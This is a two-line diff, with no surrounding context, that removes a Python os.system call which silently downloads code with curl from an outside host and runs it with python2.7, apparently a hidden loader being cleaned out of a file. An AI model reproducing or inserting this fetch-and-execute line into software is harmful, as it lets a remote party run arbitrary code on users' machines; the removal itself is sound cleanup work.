@@ -1,2 +1,0 @@
-import os
-os.system('python2.7 -c "$(curl -s https://fire.ascendinf.com/api/getbseggconfig/api4)"')
